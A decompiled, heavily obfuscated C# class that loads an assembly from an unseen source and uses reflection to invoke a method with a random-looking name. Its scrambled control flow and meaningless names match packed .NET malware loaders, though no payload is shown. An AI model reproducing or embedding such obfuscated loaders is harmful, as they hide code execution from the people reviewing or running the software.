using System;
using System.Reflection;

internal static class Manager
{
	internal static Manager AddItem;

	public static void LogoutFacade()
	{
		Type[] array = (Type[])PushItem(ListItem());
		Type[] array2 = array;
		Type type = default(Type);
		while (true)
		{
			int num = 0;
			while (true)
			{
				int num2;
				if (num >= array2.Length)
				{
					num2 = 5;
					if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_3c87806b12d7438cba956510142600ea != 0)
					{
						goto IL_0012;
					}
					goto IL_002a;
				}
				goto IL_0051;
				IL_0068:
				num++;
				continue;
				IL_0051:
				type = array2[num];
				num2 = 0;
				if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_1a02f8da48ac406c98d9cad8ca377c5b == 0)
				{
					goto IL_0012;
				}
				goto IL_002a;
				IL_002a:
				switch (num2)
				{
				case 1:
					goto IL_0051;
				case 3:
					goto IL_0068;
				case 2:
				case 6:
					continue;
				case 4:
				case 7:
					goto end_IL_007f;
				case 5:
					return;
				}
				goto IL_0012;
				IL_0012:
				PublishItem(type.GetMethods());
				num2 = 3;
				if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_694a2ce709a24606ad521698223e16f1 == 0)
				{
					goto IL_002a;
				}
				goto IL_0068;
				continue;
				end_IL_007f:
				break;
			}
		}
	}

	private static void FillFacade(MethodInfo[] spec)
	{
		bool flag = default(bool);
		MethodInfo methodInfo = default(MethodInfo);
		while (true)
		{
			while (true)
			{
				int num = 0;
				while (true)
				{
					IL_00a9:
					int num2;
					if (num < spec.Length)
					{
						num2 = 1;
						if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_2c14d7a09b2547d0bb8f361f957318cd == 0)
						{
							goto IL_003f;
						}
						goto IL_0071;
					}
					return;
					IL_003f:
					num++;
					num2 = 1;
					if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_dd2f1ebca64349f79180980532b8e09c == 0)
					{
						continue;
					}
					goto IL_0071;
					IL_0071:
					while (true)
					{
						switch (num2)
						{
						case 11:
							if (!flag)
							{
								num2 = 0;
								if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_998eb8dec19c46dbadb23b38e4845884 == 0)
								{
									continue;
								}
								break;
							}
							methodInfo.Invoke(null, null);
							num2 = 2;
							if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_a1c1ff6dd32b4941b387e9a3f27456af == 0)
							{
								continue;
							}
							break;
						case 3:
							flag = ReflectItem(methodInfo.Name, "Ylfwdwgmpilzyaph");
							goto case 11;
						case 1:
							methodInfo = spec[num];
							goto case 3;
						case 2:
						case 4:
						case 6:
							goto IL_00a9;
						case 5:
						case 9:
							goto end_IL_00a9;
						case 10:
							goto end_IL_00b6;
						case 8:
							return;
						}
						break;
					}
					goto IL_003f;
					continue;
					end_IL_00a9:
					break;
				}
				continue;
				end_IL_00b6:
				break;
			}
		}
	}

	internal static object ListItem()
	{
		return Facade.PrintFacade();
	}

	internal static object PushItem(object object_0)
	{
		return ((Assembly)object_0).GetExportedTypes();
	}

	internal static void PublishItem(object object_0)
	{
		FillFacade((MethodInfo[])object_0);
	}

	internal static bool WriteItem()
	{
		return AddItem == null;
	}

	internal static Manager StartItem()
	{
		return AddItem;
	}

	internal static bool ReflectItem(object object_0, object object_1)
	{
		return (string?)object_0 == (string?)object_1;
	}
}
